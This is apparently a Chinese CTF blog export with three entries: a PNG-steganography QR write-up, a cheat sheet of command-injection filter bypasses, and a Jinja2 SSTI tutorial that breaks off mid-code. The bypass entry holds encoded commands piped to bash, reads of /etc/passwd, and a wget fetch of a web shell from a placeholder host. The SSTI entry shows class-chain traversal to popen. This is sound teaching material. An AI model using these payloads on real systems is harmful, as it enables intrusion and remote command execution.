<h2 id="10梅花香自苦寒来"><a href="#10梅花香自苦寒来" class="headerlink" title="10梅花香自苦寒来"></a>10梅花香自苦寒来</h2><p>附件是一张<code>png</code>，没有其他明显的提示，看一眼属性</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209152723027.png" alt="image-20241209152723027"></p>
<p>要画图，那么应该藏了坐标，010查一下</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209152821648.png" alt="image-20241209152821648"></p>
<p>可以看到文件尾藏了一种数据，接下来有两种方法</p>
<blockquote>
<p>随波逐流</p>
</blockquote>
<p>将文件拖入会自动提取并且解码，再用其内置的坐标画图最终得到一张反色的二维码</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209153156877.png" alt="image-20241209153156877"></p>
<p>这个时候用<code>stegsolve</code>反色再扫就出来了</p>
<blockquote>
<p>脚本画图</p>
</blockquote>
<p>选首尾位置复制到记事本，复制到厨子再hex解码，得到一串坐标<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209154148273.png" alt="image-20241209154148273"></p>
<p>贴到txt里，接下来就是画图，参考了别的师傅的wp,有两种做法</p>
<p>​	<code>*gnuplot*</code>绘图</p>
<p>贴个脚本先</p>
<pre><code class="highlight plaintext">with open(&#x27;flag.txt&#x27;, &#x27;r&#x27;) as res:  # 坐标格式文件比如(7,7)
    re = res.read()
    res.close()
    
with open(&#x27;output.txt&#x27;, &#x27;w&#x27;) as gnup:   # 将转换后的坐标写入gnuplotTxt.txt
    re = re.split()
    tem = &#x27;&#x27;
    for i in range(0, len(re)):
        tem = re[i]
        tem = tem.lstrip(&#x27;(&#x27;)
        tem = tem.rstrip(&#x27;)&#x27;)
        for j in range(0, len(tem)):
            if tem[j] == &#x27;,&#x27;:
                tem = tem[:j] + &#x27; &#x27; + tem[j+1:]
        gnup.write(tem + &#x27;\n&#x27;)
    gnup.close()</code></pre>

<p>得到去括号，去逗号的坐标值</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209155236795.png" alt="image-20241209155236795"></p>
<p>贴一下ubuntu下的下载和使用方法</p>
<pre><code class="highlight bash"><span class="built_in">sudo</span> apt-get install gnuplot-x11
gnuplot
plot <span class="string">&quot;output.txt&quot;</span></code></pre>

<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209155627592.png" alt="image-20241209155627592"></p>
<p>可以扫出来</p>
<p>​	<em>matplotlib</em>绘图</p>
<p>把原文本去括号，用脚本跑</p>
<pre><code class="highlight plaintext">import matplotlib.pyplot as plt
import numpy as np
with open(&#x27;flag.txt&#x27;, &#x27;r&#x27;) as res:
    re = res.read()
    res.close()

with open(&#x27;output.txt&#x27;, &#x27;w&#x27;) as gnup:  # 将转换后的坐标写入gnuplotTxt.txt
    re = re.split()
    tem = &#x27;&#x27;
    for i in range(0, len(re)):
        tem = re[i]
        tem = tem.lstrip(&#x27;(&#x27;)
        tem = tem.rstrip(&#x27;)&#x27;)
        gnup.write(tem + &#x27;\n&#x27;)
    gnup.close()
x, y = np.loadtxt(&#x27;output.txt&#x27;, delimiter=&#x27;,&#x27;, unpack=True)
plt.plot(x, y, &#x27;.&#x27;)
plt.show()</code></pre>

<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209162242387.png" alt="image-20241209162242387"></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>misc</tag>
      </tags>
  </entry>
  <entry>
    <title>RCE</title>
    <url>/2025/01/21/RCE/</url>
    <content><![CDATA[<h1 id="RCE（远程代码执行漏洞）原理及漏洞相关"><a href="#RCE（远程代码执行漏洞）原理及漏洞相关" class="headerlink" title="RCE（远程代码执行漏洞）原理及漏洞相关"></a>RCE（远程代码执行漏洞）原理及漏洞相关</h1><p>RCE，Romote Code Execution漏洞，即通过向后台服务器远程注入系统命令或代码来控制后台系统</p>
<p><strong>原理</strong></p>
<p>一般出现这种漏洞，是因为应用系统从设计上需要给用户提供指定的远程命令操作的接口。比如我们常见的路由器、防火墙、入侵检测等设备的web管理界面上。一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。 如果，设计者在完成该功能时，没有做严格的安全控制，则可能会导致攻击者通过该接口提交“意想不到”的命令，从而让后台进行执行，从而控制整个后台服务器。 现在很多的企业都开始实施自动化运维,大量的系统操作会通过”自动化运维平台”进行操作。在这种平台上往往会出现远程系统命令执行的漏洞。 远程代码执行 同样的道理,因为需求设计,后台有时候也会把用户的输入作为代码的一部分进行执行,也就造成了远程代码执行漏洞。 不管是使用了代码执行的函数,还是使用了不安全的反序列化等等。 因此，如果需要给前端用户提供操作类的API接口，一定需要对接口输入的内容进行严格的判断，比如实施严格的白名单策略会是一个比较好的方法。</p>
<p><strong>系统命令执行函数</strong></p>
<pre><code class="highlight plaintext">*** system() 语法为system(string $command, int &amp;$return var = ?)
*** passthru() system()的平替，写个命令就会执行命令，自己能回显
*** exec() 示例exec(&quot;cat /flag&quot;)，其本身没有回显
*** shell_exec() 格式分别为shell_exec（ls）和`ls`,不能自己回显，需要借用echo\print等输出结果
*** popen() 语法为popen(string $command, string $mode),command参数: 要执行的命令,mode参数: 模式&#x27;r&#x27;表示阅读，&#x27;w&#x27; 表示写入。不能自己回显，需要print_r等输出内容
*** proc_open() 语法为proc_open($command,$descriptor spec,$pipes,$cwd,$env vars,$options)
$command是要执行的命令。
$descriptorspec是一个描述符规范数组，用于指定进程的输入、输出和错误的文件描述符。
$pipes是一个引用变量，用于存储与进程相关的管道。
$cwd（可选）是设置子进程的当前工作目录。
$env（可选）是设置子进程的环境变量。
$other_options（可选）是其他选项，如设置超时等
不能直接回显
*** pcntl_exec()  语法格式为pcntl exec(string $path, array $args = ?, array $envs = ?)
path必须时可执行二进制文件路径或一个在文件第一行指定了 一个可执行文件路径标头的脚本 (比如文件第一行是#!/usr/local/bin/perl的perl脚本)。args是一个要传递给程序的参数的字符串数组。
envs是一个要传递给程序作为环境变量的字符串数组。这个数组是 key =&gt; value格式的，key代表要传递的环境变量的名称，value代表该环境变量值。该函数没有回显，解决方法一：cat文件并输出到有权限读取路径；解决方法二：shell反弹</code></pre>

<p>那么如果遇到类似PING的执行漏洞，如何将前面的字段和系统命令无缝衔接呢？</p>
<p>那么就需要管道符来支持：</p>
<p>*<strong>关于管道符</strong></p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/803305e48f88c6e5804f38315b798f21.png" alt="img"></p>
<p><strong>For Windows：</strong></p>
<p>“|” : 直接执行后面的语句。例如：<code>ping 127.0.0.1| whoami</code><br>“||” : 如果前面执行的语句执行出错，则执行后面的语句，否则只执行前面的语句。例如： <code>ping 1234.1 || whoami</code><br>“&amp;” : 如果前面的语句为假则直接执行后面的语句，前面的语句可真可假 。例如： <code>ping 127.0.0.1 &amp; whoami</code><br>“&amp;&amp;” : 如果前面的语句为假则直接出错，也不执行后面的语句，前面的语句只能为真。例如： <code>ping 127.0.0.1 &amp;&amp; whoami</code></p>
<p><strong>For Linux:</strong></p>
<p>“;” : 执行完前面的语句再执行后面的。 例如： <code>ping 127.0.0.1 ; whoami</code><br>“|” : 显示后面语句的执行结果。列如：<code>ping 127.0.0.1 | whoami</code><br>“||” : 当前的语句执行出错时，执行后面的语句。 例如： <code>ping 1472.1 || whoami</code><br>“&amp;” : 如果前面得语句为假则直接执行后面的语句，前面的语句可真可假，例如：<code>ping 127.0.0.1 | &amp; whoami</code><br>“&amp;&amp;” : 如果前面的语句为假则直接出错，也不执行后面的，前面的语句只能为真。例如： <code>ping 127.0.0.1 &amp;&amp; whoami</code></p>
<p>发现漏洞后，如何得到控制权呢？</p>
<p>最简单的漏洞就是找到注入点直接注</p>
<p>但是难免会碰到存在黑名单的情况，这个时候就需要绕过出场了</p>
<h2 id="空格过滤绕过："><a href="#空格过滤绕过：" class="headerlink" title="空格过滤绕过："></a>空格过滤绕过：</h2><h3 id="大括号-："><a href="#大括号-：" class="headerlink" title="大括号{}："></a>大括号{}：</h3><pre><code class="highlight plaintext">&#123;cat,flag.php&#125;</code></pre>

<h3 id="IFS代替空格："><a href="#IFS代替空格：" class="headerlink" title="$IFS代替空格："></a><code>$IFS</code>代替空格：</h3><p><code>$IFS$9</code>，<code>$&#123;IFS&#125;</code>，<code>$IFS</code>这三个都行</p>
<p>Linux下有一个特殊的环境变量叫做IFS，叫做内部字段分隔符 (internal field separator)。</p>
<pre><code class="highlight plaintext">?cmd=ls$IFS-I</code></pre>

<p>单纯$IFS2,IFS2被bash解释器当做变量名，输不出来结果，加一个{}就固定了变量名</p>
<pre><code class="highlight plaintext">?cmd=ls$&#123;IFS&#125;-l</code></pre>

<p>$IFS$9后面加个$与{}类似，起截断作用，$9是当前系统shell进程第九个参数持有者始终为空字符串。</p>
<pre><code class="highlight plaintext">?cmd=ls$&#123;IFS&#125;$9-l</code></pre>

<h3 id="重定向字符"><a href="#重定向字符" class="headerlink" title="重定向字符&lt;，&lt;&gt;"></a>重定向字符&lt;，&lt;&gt;</h3><p>(具体哪种情景能用还不太清楚)</p>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>%20绕过(相当于url编码的空格)</p>
<p>%09绕过（相当于Tab键）</p>
<p>%0a–代表换行符</p>
<p>%0b–用于在输出或显示文本时在该位置产生一个固定的垂直间距，类似于tab键。</p>
<p>%0d–回车换行</p>
<p>%a0–代表的是非断行空格</p>
<p>%00–%00代表的是ASCII码中的空字符</p>
<p>可以将空格字符替换成注释&#x2F;**&#x2F;，也可以使用内联注释<code>/!code/</code>        </p>
<p>内联注释绕过知识点</p>
<pre><code>    当一些关键语句被过滤时，内联注释就是把一些特有的仅在 mysql 上的语句放在 /*!  */中，这样这些语句如果在其它数据库中是不会被执行，但在 mysql 中会执行
</code></pre>
<h2 id="文件名过滤绕过："><a href="#文件名过滤绕过：" class="headerlink" title="文件名过滤绕过："></a>文件名过滤绕过：</h2><h3 id="绕过"><a href="#绕过" class="headerlink" title="??,*绕过"></a>??,*绕过</h3><p><code>passthru</code>代替<code>system</code>，过滤flag文件名用?，*绕过</p>
<pre><code class="highlight plaintext">cat /fl??

cat /f*  #多个匹配结果同时展现</code></pre>

<p>以上指令等效于<code>cat /flag</code></p>
<h3 id="单引号-‘-双引号-“”-反引号-绕过正则"><a href="#单引号-‘-双引号-“”-反引号-绕过正则" class="headerlink" title="单引号(‘)双引号(“”)反引号(&#96;&#96;)绕过正则"></a>单引号(‘)双引号(“”)反引号(&#96;&#96;)绕过正则</h3><pre><code class="highlight plaintext">cat /fl&quot;&quot;ag

c&quot;&quot;at /e&#x27;t&#x27;c/pas``s``wd</code></pre>

<p>对<code>php</code>来说这是<code>fl&quot;&quot;ag</code>而不是<code>flag</code>关键字不会匹配上，但是对于linux系统来说<code>cat /fl&quot;&quot;ag</code>等效于<code>cat /flag</code>。外面包裹的是单引号里面就是双引号，外面包裹的是双引号里面就是单引号，或者用斜线\去掉功能性，避免报错</p>
<pre><code class="highlight plaintext">passthru(&#x27;cat /fl&quot;&quot;ag.p\&#x27;\&#x27;hp&#x27;)</code></pre>

<h3 id="反斜杠-绕过"><a href="#反斜杠-绕过" class="headerlink" title="反斜杠\绕过"></a>反斜杠\绕过</h3><p>\特殊字符去掉功能性，单纯表示为字符串，而linux看到反斜线\会自动帮你去掉,正常执行命令</p>
<pre><code class="highlight plaintext">cat fl\ag.p\hp</code></pre>

<h3 id="特殊变量：-1到-9、-和"><a href="#特殊变量：-1到-9、-和" class="headerlink" title="特殊变量：$1到$9、$@和$*"></a>特殊变量：$1到$9、$@和$*</h3><p>这些特殊变量输出为空</p>
<pre><code class="highlight plaintext">cat /fl$9ag

cat /fl$@ag</code></pre>

<p>或者在单词结尾处插入$x，这里的x可以是任意字母，例如可以写成如下形式：</p>
<pre><code class="highlight plaintext">c$@at /e$@tc/pas$@swd

cat$x /etc$x/passwd$x

ca$@t /etc$x/passwd$x</code></pre>

<h3 id="内联执行绕过（通过赋值绕过）"><a href="#内联执行绕过（通过赋值绕过）" class="headerlink" title="内联执行绕过（通过赋值绕过）"></a>内联执行绕过（通过赋值绕过）</h3><p>a&#x3D;c;b&#x3D;a;c&#x3D;t;$a$b$c &#x2F;1.txt</p>
<p>a&#x3D;f;c&#x3D;a;d&#x3D;g;b&#x3D;l;cat $a$b$c$d.php（abcd拼接出来flag）</p>
<h3 id="利用linux中的环境变量"><a href="#利用linux中的环境变量" class="headerlink" title="利用linux中的环境变量"></a>利用linux中的环境变量</h3><p>使用环境变量里的字符执行变量</p>
<p>echo $PATH              #PATH默认系统环境变量</p>
<p>如果出现：</p>
<pre><code class="highlight bash">/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin</code></pre>

<p>则以下代码表示了flag.php</p>
<pre><code class="highlight plaintext">echo f$&#123;PATH:5:1&#125;$&#123;PATH:8:1&#125;$&#123;PATH:66:1&#125;.$&#123;PATH:93:1&#125;h$&#123;PATH:93:1&#125;</code></pre>

<p>比如${PATH:5:1}指的是取路径的第五位（从0开始数，第0位是&#x2F;）的字符，步长为1，即只取一个字母l，以此类推就能拼接成关键字<code>flag.php</code></p>
<h2 id="常见文件读取命令绕过："><a href="#常见文件读取命令绕过：" class="headerlink" title="常见文件读取命令绕过："></a>常见文件读取命令绕过：</h2><h3 id="base64编码："><a href="#base64编码：" class="headerlink" title="base64编码："></a>base64编码：</h3><pre><code class="highlight plaintext">cat flag.php--&gt; Y2FOIGZSYWcucGhw
echo Y2FOIGZsYWcucGhw | base64 -d</code></pre>

<p>管道符|把前面指令执行的结果，变成后面指令的参数，所以这里会解码读取命令</p>
<p>执行命令的话有三种形式：</p>
<pre><code class="highlight plaintext">echo Y2FOIGZsYWcucGhw | base64 -d | bash

$(echo Y2FOIGZsYWcucGhw | base64 -d)

`echo Y2FOIGZsYWcucGhw | base64 -d`   #反引号</code></pre>

<p> 把<code>cat flag.php</code>，放在bash里执行，同理想换成什么命令就base64编码后替换</p>
<h3 id="base32编码同理"><a href="#base32编码同理" class="headerlink" title="base32编码同理"></a>base32编码同理</h3><pre><code class="highlight plaintext">?cmd=system(&#x27;echo &quot;MNQXIIDGNRQWOLTQNBYA====&quot;|base32 -d|/bin/bash&#x27;);</code></pre>

<h3 id="HEX编码（ASCII编码）"><a href="#HEX编码（ASCII编码）" class="headerlink" title="HEX编码（ASCII编码）"></a>HEX编码（ASCII编码）</h3><h4 id="python脚本"><a href="#python脚本" class="headerlink" title="python脚本"></a>python脚本</h4><pre><code class="highlight plaintext">import binascii
s = b&quot;tac flag&quot;
h = binascii.b2a_hex(s)
print(h)</code></pre>

<p>tac flag–&gt; 74616320666c6167</p>
<pre><code class="highlight plaintext">echo &quot;74616320666c6167”|xxd -r -p|bash</code></pre>

<h4 id="xxd-二进制显示和处理文件工具。"><a href="#xxd-二进制显示和处理文件工具。" class="headerlink" title="xxd: 二进制显示和处理文件工具。"></a>xxd: 二进制显示和处理文件工具。</h4><p>-r-p将纯十六进制转储的反向输出打印为了ASCII格式<br>bash、sh、&#x2F;bin&#x2F;bash、反引号等</p>
<pre><code class="highlight plaintext">?cmd=passthru(&#x27;echo &quot;74616320666c6167”|xxd -r -p|bash&#x27;);</code></pre>

<h4 id="shellcode编码（16进制的机器码）"><a href="#shellcode编码（16进制的机器码）" class="headerlink" title="shellcode编码（16进制的机器码）"></a>shellcode编码（16进制的机器码）</h4><pre><code class="highlight plaintext">?cmd=passthru(&#x27;printf&quot;\x74\x61\x63\x20\x66\x6c\x61\x67\x2e\x70\x68\x70&quot;|bash&#x27;);

?cmd=passthru(&#x27;`printf&quot;\x74\x61\x63\x20\x66\x6c\x61\x67\x2e\x70\x68\x70&quot;`&#x27;);

?cmd=passthru(&#x27;$(printf&quot;\x74\x61\x63\x20\x66\x6c\x61\x67\x2e\x70\x68\x70&quot;)&#x27;);</code></pre>

<h2 id="读取命令被绕过："><a href="#读取命令被绕过：" class="headerlink" title="读取命令被绕过："></a>读取命令被绕过：</h2><p>比如说过滤了cat，在这之前先分清:</p>
<p><code>cat flag.php</code> 是用于在终端上显示当前目录下名为 <code>flag.php</code> 的文件的内容。</p>
<p><code>cat /flag</code> 是用于在终端上显示根目录下名为 flag 的文件的内容。</p>
<p><code>cat flag</code> 是用于在终端上显示当前目录下名为 flag 的文件的内容。</p>
<p>正常来说flag放在根目录下，不过也可能是在当前网页目录下</p>
<p>别的指令也同理</p>
<ul>
<li><p>tac:反向显示，从最后一行开始往前显示</p>
<pre><code class="highlight plaintext">tac /flag</code></pre>


</li>
<li><p>more:一页一页显示档案内容</p>
<pre><code class="highlight plaintext">more flag.php</code></pre>


</li>
<li><p>less：与more类似</p>
</li>
<li><p>tail：查看末尾几行</p>
</li>
<li><p>nl：显示的时候，顺便输出行号</p>
<pre><code class="highlight plaintext">nl /flag</code></pre></li>
</ul>
<p><code>nl /flag</code> 和 <code>nl flag</code> 是不同的。</p>
<p>在 Linux 系统中，<code>nl</code>命令用于给文件添加行号。当使用 <code>nl /flag</code> 命令时，<code>/flag</code> 被视为一个文件路径，并将该文件的内容输出到标准输出（通常是终端），并在每一行前添加行号。如果 &#x2F;flag 文件存在且有读取权限，那么 <code>nl /flag</code> 将会给该文件的内容添加行号。</p>
<p>而当使用 <code>nl flag</code> 命令时，flag 被视为一个相对于当前目录的文件路径。也就是说，<code>nl flag</code> 命令将会尝试在当前目录下找到名为 flag 的文件，并给其内容添加行号。（不过flag一般在根目录）</p>
<ul>
<li>od：以二进制方式读取档案内容。正常的<code>od /flag</code>输出的纯纯二进制<br>想看到文件内容需要：</li>
</ul>
<pre><code class="highlight plaintext">passthru(&quot;od -A d -c /fla\g&quot;);</code></pre>

<ul>
<li><p>xxd：读取二进制文件</p>
<pre><code class="highlight plaintext">xxd /flag</code></pre>


</li>
<li><p>sort：主要用于排序文件 </p>
<pre><code class="highlight plaintext">so?t /flag
/usr/bin/s?rt /flag</code></pre></li>
</ul>
<p><code>/usr/bin/sort</code> 和 <code>sort</code> 实际上是同一个命令。<code>/usr/bin</code> 目录是系统的标准目录之一，它包含了许多系统命令和工具的二进制文件，而 sort 命令通常就存放在 <code>/usr/bin</code> 目录中,因此<code>/usr/bin/sort /flag</code> 和 <code>sort /flag</code> 是等价的。有时候sort不行可能<code>/usr/bin/s?r</code>t可以</p>
<ul>
<li>uniq：报告或删除文件中重复的行，其实当成cat用就行</li>
<li>file -f:报错出具体内容<br>passthru(“file -f &#x2F;flag”);</li>
<li>grep：在文本中查找指定字符串<br>passthru(“grep fla &#x2F;fla*”);</li>
</ul>
<p>grep fla &#x2F;fla* 命令会匹配根目录下所有以 fla 开头的文件（不包括子目录），然后将这些文件中包含字符串 fla 的行输出到终端上。因此，这个命令会搜索根目录下以 fla 开头的所有文件，并匹配其中包含 fla 字符串的行。</p>
<p>而 grep fla fla* 命令中 fla* 是当前目录下以 fla 开头的所有文件的通配符，它会匹配当前目录下所有以 fla 开头的文件，然后将这些文件中包含字符串 fla 的行输出到终端上。因此，这个命令只会搜索当前目录下以 fla 开头的文件，并匹配其中包含 fla 字符串的行。</p>
<ul>
<li>strings：<br>相当于cat</li>
</ul>
<h2 id="无回显时间盲注："><a href="#无回显时间盲注：" class="headerlink" title="无回显时间盲注："></a>无回显时间盲注：</h2><p>逻辑和SQL注入的时间盲注差不多</p>
<p>相关命令：<br>1.sleep<br>sleep 5       #5秒之后返回结果</p>
<p>2.awk：逐行获取数据<br>3.cut -c<br>cut命令逐列获取单个字符<br>cat flag | awk NR&#x3D;&#x3D;2  | cut -c 1      #获取第一个字符<br>cat flag | awk NR&#x3D;&#x3D;2  | cut -c 2      #获取第二个字符</p>
<p>3.利用cp命令：cp flag.php 1.txt</p>
<p>4.利用mv命令：mv flag.php 1.txt</p>
<p>5.利用&gt;输出结果到文件：ls &gt; 1.txt</p>
<p>6.tee:Linux tee命令用于读取标准输入的数据，并将其内容输出成文件</p>
<p>7.利用wget下载：</p>
<pre><code class="highlight plaintext">wget http://ip/shell.txt &gt; shell.php或者wget http://ip/shell.txt -O shell.php</code></pre>

<p>8.dnslog外带数据</p>
]]></content>
      <tags>
        <tag>-Web -CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>SSTI漏洞</title>
    <url>/2025/01/22/SSTI%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="SSTI（模板注入）漏洞"><a href="#SSTI（模板注入）漏洞" class="headerlink" title="SSTI（模板注入）漏洞"></a>SSTI（模板注入）漏洞</h1><p>模板引擎（这里特指用于Web开发的模板引擎）是为了使用户界面与业务数据（内容）分离而产生的，它可以生成特定格式的文档，利用模板引擎来生成前端的html代码，模板引擎会提供一套生成html代码的程序，然后只需要获取用户的数据，然后放到渲染函数里，然后生成模板+用户数据的前端html页面，然后反馈给浏览器，呈现在用户面前。</p>
<p>模板引擎也会提供沙箱机制来进行漏洞防范，但是可以用沙箱逃逸技术来进行绕过。</p>
<h2 id="模板注入漏洞"><a href="#模板注入漏洞" class="headerlink" title="模板注入漏洞"></a>模板注入漏洞</h2><p>SSTI 就是服务器端模板注入（Server-Side Template Injection）</p>
<p>当前使用的一些框架，比如python的<code>flask</code>，php的<code>tp</code>，java的<code>spring</code>等一般都采用成熟的的MVC的模式，用户的输入先进入Controller控制器，然后根据请求类型和请求的指令发送给对应Model业务模型进行业务逻辑判断，数据库存取，最后把结果返回给View视图层，经过模板渲染展示给用户。</p>
<p>漏洞成因就是服务端接收了用户的恶意输入(一般来说是用户输入的变量)以后，未经任何处理就将其作为 Web 应用模板内容的一部分，模板引擎在进行目标编译渲染的过程中，执行了用户插入的可以破坏模板的语句，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。其影响范围主要取决于模版引擎的复杂性。</p>
<p>凡是使用模板的地方都可能会出现 SSTI 的问题，SSTI 不属于任何一种语言，沙盒绕过也不是，沙盒绕过只是由于模板引擎发现了很大的安全漏洞，然后模板引擎设计出来的一种防护机制，不允许使用没有定义或者声明的模块，这适用于所有的模板引擎。</p>
<h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><p>php常见的模板：twig，smarty，blade</p>
<h2 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h2><p>python常见的模板有：Jinja2，tornado</p>
<p>贴一下框架的判断方法</p>
<pre><code class="highlight plaintext">&#123;7*7&#125; -&gt;49 -&gt; smarty

&#123;&#123;7*&#x27;7&#x27;&#125;&#125; -&gt; 49 -&gt; twig

&#123;&#123;7*&#x27;7&#x27;&#125;&#125; -&gt; 7777777 -&gt; jinjia2</code></pre>

<p><strong>模糊测试:</strong></p>
<p><code>class</code><br><code>bases</code><br><code>mro</code><br><code>subclasses</code><br><code>getitem</code><br><code>init</code><br><code>globals</code><br><code>builtins</code><br><code>import</code><br><code>url_for</code><br><code>lipsum</code><br><code>config</code><br><code>popen</code><br><code>request</code><br><code>&#39;&#39;</code><br><code>&quot;&quot;</code><br><code>[]</code><br><code>()</code><br><code>.</code><br><code>+</code><br><code>_</code></p>
<p><code>0-9</code><br><code>$</code><br><code>%</code></p>
<p>在后续的攻击中，一般会有大量的过滤，这里需要搞一下类之间的继承关系，通过继承关系的不断调用来达到RCE的目的(这里参考了其他师傅的博客)</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/12b88699f2f17cdb66c96df653330b03.png" alt="img"></p>
<p>可以看到我们创建了4个类，其中的B类继承了A类，C、D类继承了B类,如果我们在这创建一个C的对象c，那么我们就可以通过<code>__class__</code>魔术方法来找到它的当前类</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/32629cc50bef871c175ff2cb97ba6987.png" alt="img"></p>
<p>可以看到它返回了一个当前的类为C，我们还可以通过<code>__base__</code>这个魔术方法来找到当前类的父类</p>
<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/2fbe9f85aa0cf607d5d5fcc88271531a.png" alt="img" style="zoom: 80%;">

<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/8c05f226639630b4d4ad107563d1c0c3.png" alt="img" style="zoom:80%;"><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/7d5077f18454f36e57b3f115a9bd759d.png" alt="img" style="zoom:80%;"></p>
<p>这样就可以一步步叠上去，找到上面所有父类</p>
<p>C-&gt;B-&gt;A-&gt;Object</p>
<p>当然，你也可以直接用<code>__mor__</code>魔术方法以数组形式返回所有父类</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/d5a6a4672f9a1ccbfd8243b789e792ad.png" alt="img"></p>
<p>拿到object类后就可以用<code>__subclasses__()</code>得到当前类的所有子类</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/24edbadb9ad62466cff298486ae13f07.png" alt="img"></p>
<p>跟前面的<code>__mro__</code>魔术方法一样是用数组表示的，可以用下标找到对应的类。接下来我们给这个类进行一些初始化方法<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/a1580dabda5d7e8c5650908f99c21b90.png" alt="img">初始化方法后可以通过<code>__globals__</code>魔术方法来返回当前类方法中的全局变量字典，可能有一点点抽象，我也不太懂具体是返回什么，但是大致就是返回当前类的全局变量<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/a57a84281c102d35a1952386499a3bd4.png" alt="img">可以发现很多全局变量都在里面，我们需要最后能够进行<code>rce</code>，因此应该找到能执行系统命令的方法，这里用<code>popen</code>函数来执行系统命令，在后面加上具体的函数名即可找到对应的函数<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/1349cff6c89f458812eff436f68c7b41.png" alt="img"> 我们执行一下shell命令，这里执行一下<code>whoami</code>，这里一定要记得用.read()来读取一下，因为<code>popen</code>方法返回的是一个与子进程通信的对象，为了从该对象中获取子进程的输出，因此需要使用read()方法来读取子进程的输出】。<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/5c13d7c7df91b9d0be15f9e52b194454.png" alt="img">可以发现成功执行系统命令，这里我们就其实通过类的继承关系里大致讲完了SSTI的一个攻击的思路。</p>
<p>接下来让我们进入正题</p>
<h3 id="jinja2"><a href="#jinja2" class="headerlink" title="jinja2"></a>jinja2</h3><h4 id="基本结构"><a href="#基本结构" class="headerlink" title="基本结构"></a>基本结构</h4><p>Jinja2是一种面向Python的现代和设计友好的模板语言，它是以Django的模板为模型的</p>
<p>Jinja2是Flask框架的一部分。Jinja2会把模板参数提供的相应的值替换了  块</p>
<p>Jinja2使用 结构表示一个变量，它是一种特殊的占位符，告诉模版引擎这个位置的值从渲染模版时使用的数据中获取。</p>
<p>Jinja2 模板同样支持控制语句，像在 <code>&#123;%…%&#125; </code>块中，下面举一个常见的使用Jinja2模板引擎for语句循环渲染一组元素的例子:</p>
<p><code>&lt;ul&gt;     &#123;% for comment in comments %&#125;
         <li>&#123;&#123;comment&#125;&#125;</li>
    &#123;% endfor %&#125;&lt;ul&gt;</code></p>
<p>另外Jinja2 能识别所有类型的变量，甚至是一些复杂的类型，例如列表、字典和对象。此外，还可使用过滤器修改变量，过滤器名添加在变量名之后，中间使用竖线分隔。例如，下述模板以首字母大写形式显示变量name的值</p>
<pre><code class="highlight html">Hello, &#123;&#123;name|capitalize&#125;&#125;</code></pre>

<p>但是这只能在渲染前的模板中进行注入，如果模板已经渲染，就不存在模板注入了:</p>
<pre><code class="highlight plaintext">from flask import Flask, request
from jinja2 import Template

app = Flask(__name__)

@app.route(&quot;/&quot;)
def index():
    name = request.args.get(&#x27;name&#x27;, &#x27;guest&#x27;)

    t = Template(&quot;Hello &#123;&#123;n&#125;&#125;&quot;)
    return t.render(n=name)

if __name__ == &quot;__main__&quot;:
    app.run()</code></pre>

<p>编译运行，再次注入就会失败<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/1344396-20200903151308616-823367288.png" alt="img"></p>
<h4 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h4><pre><code class="highlight plaintext">__dict__　　 ：保存类实例或对象实例的属性变量键值对字典
__class__　　：返回一个实例所属的类
__mro__　　  ：返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。
__bases__　　：以元组形式返回一个类直接所继承的类（可以理解为直接父类）
__base__　　 ：和上面的bases大概相同，都是返回当前类所继承的类，即基类，区别是base返回单个，bases返回是元组
// __base__和__mro__都是用来寻找基类的
__subclasses__　　：以列表返回类的子类
__init__　　 ：类的初始化方法
__globals__　　   ：对包含函数全局变量的字典的引用_
_builtin__&amp;&amp;__builtins__　　：python中可以直接运行一些函数，例如int()，list()等等。　　　　　　　　　　　　　　　　　　这些函数可以在__builtin__可以查到。查看的方法是dir(__builtins__)　　　　　　　　　　　　　　　　　　在py3中__builtin__被换成了builtin　　　　　　　　　　　　　　　　　　
1.在主模块main中，__builtins__是对内建模块__builtin__本身的引用，即__builtins__完全等价于__builtin__。　　　　　　　　　　　　　　　　　　
2.非主模块main中，__builtins__仅是对__builtin__.__dict__的引用，而非__builtin__本身</code></pre>

<p>一般我们会看到<code>&#39;&#39;.__class__;().__class__;[].__class__;&quot;&quot;.__class__;&#123;&#125;.__class__</code>几种方法起手，究竟是什么意思捏</p>
<p>其实是通过最简单数据类型的类来获取元类(Object)</p>
<p><strong>利用file对象读取文件(Python2)</strong></p>
<pre><code class="highlight plaintext">for c in &#123;&#125;.__class__.__base__.__subclasses__():
    if(c.__name__==&#x27;file&#x27;):
        print(c)
